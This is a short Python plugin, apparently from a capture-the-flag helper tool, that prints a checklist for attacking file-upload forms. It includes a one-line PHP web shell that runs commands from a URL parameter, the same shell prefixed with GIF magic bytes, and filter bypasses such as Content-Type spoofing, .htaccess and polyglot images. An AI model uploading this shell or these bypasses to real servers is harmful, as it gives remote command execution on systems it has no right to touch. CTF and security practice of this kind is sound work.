def run(data, cred, args):

    G = "\033[92m"
    C = "\033[96m"
    B = "\033[94m"
    Y = "\033[93m"
    M = "\033[95m"
    W = "\033[0m"
    BOLD = "\033[1m"

    print(f"\n{B}┌── {BOLD}UPLOAD ATTACK WORKFLOW{W}{B} ───────────────────────────────┐{W}")

    print(f"\n{B}[{W}{Y}1{W}{B}]{W} Initial Upload")
    print(f"    • Try uploading a normal PHP web shell.")
    print(f"    • Use:")

    print(f"\n{Y}<?php system($_GET['cmd']); ?>{W}")

    print(f"\n{B}[{W}{Y}2{W}{B}]{W} Blacklist Filters")
    print(f"    • Fuzz executable extensions.")
    print(f"    • {Y}ctf upload.blacklist{W}")

    print(f"\n{B}[{W}{Y}3{W}{B}]{W} Whitelist Filters")
    print(f"    • Find which image extensions are allowed.")
    print(f"    • {Y}ctf upload.whitelist{W}")
    print(f"    • Generate bypass payloads:")
    print(f"      {Y}ctf upload.whitelist jpg{W}")

    print(f"\n{B}[{W}{Y}4{W}{B}]{W} Type Filters")
    print(f"    • Change the file Content-Type header.")
    print(f"    • Try:")
    print(f"      {C}image/jpeg{W}")
    print(f"      {C}image/png{W}")
    print(f"      {C}image/gif{W}")

    print(f"\n{B}[{W}{Y}5{W}{B}]{W} MIME / Magic Bytes")
    print(f"    • Prepend the file with:")

    print(f"\n{Y}GIF8{W}")

    print(f"\n    • Followed by:")

    print(f"\n{Y}<?php system($_GET['cmd']); ?>{W}")

    print(f"\n{B}[{W}{Y}6{W}{B}]{W} If Upload Succeeds But No Code Execution")
    print(f"    • Try reverse double extensions.")
    print(f"    • Try .htaccess.")
    print(f"    • Try polyglot images.")
    print(f"    • Try SVG upload.")

    print(f"\n{B}[{W}{G}+{W}{B}]{W} Workflow complete.\n")

    return data
